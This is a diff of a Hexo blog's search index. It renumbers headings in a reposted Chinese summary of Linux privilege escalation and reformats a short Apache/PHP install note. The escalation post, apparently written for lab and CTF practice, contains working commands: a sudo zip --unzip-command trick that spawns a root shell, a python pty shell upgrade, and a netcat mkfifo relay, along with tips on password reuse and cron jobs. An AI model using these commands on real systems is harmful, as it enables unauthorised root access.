@@ -5,7 +5,7 @@
     <url>/2020/03/27/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91Linux%20%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<p><a href="https://cloud.tencent.com/developer/article/1544037">https://cloud.tencent.com/developer/article/1544037</a></p>
 <a id="more"></a>
-<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a><strong>补充</strong></h2><h3 id="1、利用zip提权"><a href="#1、利用zip提权" class="headerlink" title="1、利用zip提权"></a>1、利用zip提权</h3><p>使用sudo -l 查看当前用户可以使用的root提权命令信息，发现可以执行tar和zip相关命令。<br>touch exploit<br>sudo -u root zip exploit.zip exploit -T –unzip-command=”sh -c /bin/bash”</p>
+<h2 id="一、补充"><a href="#一、补充" class="headerlink" title="一、补充"></a><strong>一、补充</strong></h2><h3 id="1、利用zip提权"><a href="#1、利用zip提权" class="headerlink" title="1、利用zip提权"></a>1、利用zip提权</h3><p>使用sudo -l 查看当前用户可以使用的root提权命令信息，发现可以执行tar和zip相关命令。<br>touch exploit<br>sudo -u root zip exploit.zip exploit -T –unzip-command=”sh -c /bin/bash”</p>
 <h3 id="2、密码复用补充"><a href="#2、密码复用补充" class="headerlink" title="2、密码复用补充"></a>2、密码复用补充</h3><p>管理员可能会设置重复使用的密码，因此可能数据库或者web后台的密码就是root密码</p>
 <p>拥有疑似root的秘密可以尝试ssh登录，若禁止root登录或被防火墙挡住，我们就想办法在低权限上输入密码，当然一般情况下linux会要求用户必须从终端设备（tty）中输入密码，禁止标准输入，sudo常常不能使用<br>因此我们可以用python模拟一个终端  python -c “import pty;pty.spawn(‘/bin/bash’)”</p>
 <h3 id="3、利用定时计划任务"><a href="#3、利用定时计划任务" class="headerlink" title="3、利用定时计划任务"></a>3、利用定时计划任务</h3><h4 id="补充1："><a href="#补充1：" class="headerlink" title="补充1："></a>补充1：</h4><p>通过查看 /etc/crontab 文件，查看其他用户是否有设定的系统定时任务，并查看对应对应任务内容，执行的任务肯定时对靶场机器的某个文件。</p>
@@ -21,7 +21,7 @@
 <p>如果找到些神秘的服务，可以用netcat做个转发</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkfifo backpipe</span><br><span class="line">nc -l 8082 0&lt;backpipe | nc remote_host 445 1&gt;backpipe</span><br></pre></td></tr></table></figure>
 <p>之后找漏洞，攻击，从头再来。</p>
-<h2 id="Linux错误配置检查"><a href="#Linux错误配置检查" class="headerlink" title="Linux错误配置检查"></a>Linux错误配置检查</h2><h3 id="1、linuxprivchecker-py"><a href="#1、linuxprivchecker-py" class="headerlink" title="1、linuxprivchecker.py"></a>1、linuxprivchecker.py</h3><h3 id="2、http-pentestmonkey-net-tools-audit-unix-privesc-check"><a href="#2、http-pentestmonkey-net-tools-audit-unix-privesc-check" class="headerlink" title="2、http://pentestmonkey.net/tools/audit/unix-privesc-check"></a>2、<a href="http://pentestmonkey.net/tools/audit/unix-privesc-check">http://pentestmonkey.net/tools/audit/unix-privesc-check</a></h3><h3 id="3、手动检查-https-blog-g0tmi1k-com-2011-08-basic-linux-privilege-escalation"><a href="#3、手动检查-https-blog-g0tmi1k-com-2011-08-basic-linux-privilege-escalation" class="headerlink" title="3、手动检查 https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/"></a>3、手动检查 <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></h3>]]></content>
+<h2 id="二、Linux错误配置检查"><a href="#二、Linux错误配置检查" class="headerlink" title="二、Linux错误配置检查"></a>二、Linux错误配置检查</h2><h3 id="1、linuxprivchecker-py"><a href="#1、linuxprivchecker-py" class="headerlink" title="1、linuxprivchecker.py"></a>1、linuxprivchecker.py</h3><h3 id="2、http-pentestmonkey-net-tools-audit-unix-privesc-check"><a href="#2、http-pentestmonkey-net-tools-audit-unix-privesc-check" class="headerlink" title="2、http://pentestmonkey.net/tools/audit/unix-privesc-check"></a>2、<a href="http://pentestmonkey.net/tools/audit/unix-privesc-check">http://pentestmonkey.net/tools/audit/unix-privesc-check</a></h3><h3 id="3、手动检查-https-blog-g0tmi1k-com-2011-08-basic-linux-privilege-escalation"><a href="#3、手动检查-https-blog-g0tmi1k-com-2011-08-basic-linux-privilege-escalation" class="headerlink" title="3、手动检查 https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/"></a>3、手动检查 <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></h3>]]></content>
       <categories>
         <category>Linux提权</category>
       </categories>
@@ -54,7 +54,9 @@
   <entry>
     <title>ubuntu 用apt-get 安装apache 和php 之后php不能解析的问题</title>
     <url>/2020/03/26/ubuntu%20%E7%94%A8apt-get%20%E5%AE%89%E8%A3%85apache%20%E5%92%8Cphp%20%E4%B9%8B%E5%90%8Ephp%E4%B8%8D%E8%83%BD%E8%A7%A3%E6%9E%90%E7%9A%84%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<h2 id="ubuntu-用apt-get-安装apache-和php-之后php不能解析的问题"><a href="#ubuntu-用apt-get-安装apache-和php-之后php不能解析的问题" class="headerlink" title="ubuntu 用apt-get 安装apache 和php 之后php不能解析的问题"></a>ubuntu 用apt-get 安装apache 和php 之后php不能解析的问题</h2><p>1.sudo apt-get install apache2<br>2.sudo apt-get install php7.0<br>3.sudo apt-get install libapache2-mod-php</p>
+    <content><![CDATA[<h2 id="1-sudo-apt-get-install-apache2"><a href="#1-sudo-apt-get-install-apache2" class="headerlink" title="1.sudo apt-get install apache2"></a>1.sudo apt-get install apache2</h2><h2 id="2-sudo-apt-get-install-php7-0"><a href="#2-sudo-apt-get-install-php7-0" class="headerlink" title="2.sudo apt-get install php7.0"></a>2.sudo apt-get install php7.0</h2><h2 id="3-sudo-apt-get-install-libapache2-mod-php"><a href="#3-sudo-apt-get-install-libapache2-mod-php" class="headerlink" title="3.sudo apt-get install libapache2-mod-php"></a>3.sudo apt-get install libapache2-mod-php</h2><a id="more"></a>
+
+<p>这里没东西啦</p>
 ]]></content>
       <categories>
         <category>服务配置</category>
